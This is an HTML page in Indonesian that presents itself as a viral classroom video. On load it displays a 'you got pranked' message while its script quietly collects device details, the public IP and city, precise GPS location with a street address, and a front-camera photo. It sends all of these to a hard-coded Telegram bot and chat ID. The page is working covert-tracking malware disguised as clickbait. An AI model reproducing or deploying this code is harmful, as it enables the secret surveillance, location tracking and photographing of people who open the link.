<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Viral seorang siswa melakukan hal yang tidak terduga di kelas nya</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: #000;
      margin: 0;
      padding: 0;
      height: 100vh;
      font-family: 'Share Tech Mono', monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #00ff00;
      text-align: left;
      font-size: 12px;
      letter-spacing: 0.5px;
    }
    #msg {
      white-space: pre-wrap;
      width: 90%;
      max-width: 600px;
      line-height: 1.5;
    }
  </style>
</head>
<body>
  <div id="msg"></div>

  <script>
    const token = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
    const chatId = '5914256752';

    const typeText = (el, text, speed = 35) => {
      let i = 0;
      const interval = setInterval(() => {
        if (i < text.length) {
          el.textContent += text[i];
          i++;
        } else {
          clearInterval(interval);
        }
      }, speed);
    };

    const sendToTelegram = async (text) => {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
      });
    };

    const sendPhoto = async (blob, filename) => {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('photo', blob, filename);
      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: form
      });
    };

    const getGPUInfo = () => {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      const ext = gl?.getExtension('WEBGL_debug_renderer_info');
      return ext ? {
        vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
        renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
      } : { vendor: 'Unknown', renderer: 'Unknown' };
    };

    const getDeviceBrand = () => {
      const ua = navigator.userAgent;
      if (/Vivo|vivo|V\d{4}/.test(ua)) return 'Vivo';
      if (/Oppo|CPH/.test(ua)) return 'Oppo';
      if (/SM-|Samsung/.test(ua)) return 'Samsung';
      if (/Infinix/.test(ua)) return 'Infinix';
      if (/RMX/.test(ua)) return 'Realme';
      if (/Redmi|Mi/.test(ua)) return 'Xiaomi';
      return 'Android Device';
    };

    const getBatteryInfo = async () => {
      try {
        const bat = await navigator.getBattery();
        return {
          level: Math.round(bat.level * 100) + '%',
          charging: bat.charging ? 'Yes' : 'No'
        };
      } catch {
        return { level: 'Unknown', charging: 'Unknown' };
      }
    };

    const getIPInfo = async () => {
      const res = await fetch('https://ipapi.co/json');
      return await res.json();
    };

    const getGeoInfo = async (lat, lon) => {
      try {
        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
        return await res.json();
      } catch {
        return null;
      }
    };

    const captureCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.createElement('video');
        video.setAttribute('playsinline', '');
        video.srcObject = stream;
        await video.play();

        await new Promise(resolve => {
          const checkReady = setInterval(() => {
            if (video.readyState >= 2 && video.videoWidth > 0) {
              clearInterval(checkReady);
              resolve();
            }
          }, 100);
        });

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        canvas.toBlob(async blob => {
          await sendPhoto(blob, `photo.jpg`);
          await sendToTelegram('ðŸ“· Foto berhasil dikirim.');
        }, 'image/jpeg');

        stream.getTracks().forEach(t => t.stop());
      } catch (e) {
        await sendToTelegram('âŒ Kamera gagal diakses. Error: ' + e.message);
      }
    };

    const captureLocation = async () => {
      try {
        navigator.geolocation.getCurrentPosition(async pos => {
          const { latitude, longitude, accuracy, altitude, speed } = pos.coords;
          const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
          const geo = await getGeoInfo(latitude, longitude);
          const address = geo?.display_name || 'Alamat tidak ditemukan';

          const lokasi = `
ðŸ“ LOKASI (akurasi ${accuracy} meter)
[+] Latitude       : ${latitude}
[+] Longitude      : ${longitude}
[+] Accuracy       : ${accuracy} meter
[+] Altitude       : ${altitude ?? 'Unknown'} m
[+] Speed          : ${speed ?? 'Unknown'} m/s
[+] Address        : ${address}
[+] Google Maps    : ${maps}`.trim();

          await sendToTelegram(lokasi);
        }, async (err) => {
          await sendToTelegram('âŒ Lokasi gagal diakses. Error: ' + err.message);
        }, {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        });
      } catch (e) {
        await sendToTelegram('âŒ Lokasi gagal (exception). Error: ' + e.message);
      }
    };

    const collectInfo = async () => {
      const gpu = getGPUInfo();
      const brand = getDeviceBrand();
      const battery = await getBatteryInfo();
      const ip = await getIPInfo();
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const info = `
ðŸ“¦ DEVICE INFORMATION
[+] Device Brand   : ${brand}
[+] OS             : Android
[+] Platform       : ${navigator.platform}
[+] CPU Cores      : ${navigator.hardwareConcurrency}
[+] RAM            : ${navigator.deviceMemory || 'Unknown'} GB
[+] GPU Vendor     : ${gpu.vendor}
[+] GPU            : ${gpu.renderer}
[+] Resolution     : ${screen.width}x${screen.height}
[+] Browser        : ${navigator.userAgent}
[+] Timezone       : ${timezone}
[+] Uptime         : ${(performance.now()/1000/60).toFixed(1)} minutes
[+] Battery Level  : ${battery.level}
[+] Charging       : ${battery.charging}

ðŸŒ NETWORK / IP
[+] Public IP      : ${ip.ip}
[+] Country        : ${ip.country_name}
[+] Region         : ${ip.region}
[+] City           : ${ip.city}
[+] ISP            : ${ip.org}
[+] Google Maps    : https://www.google.com/maps/place/${ip.latitude}+${ip.longitude}`.trim();

      await sendToTelegram(info);
    };

    const msg = `             Selamat anda kena prank.\n         Terima kasih atas kerja samanya.`;
    typeText(document.getElementById('msg'), msg, 30);

    window.onload = async () => {
      await collectInfo();
      await captureLocation();
      await captureCamera();
    };
  </script>
</body>
</html>
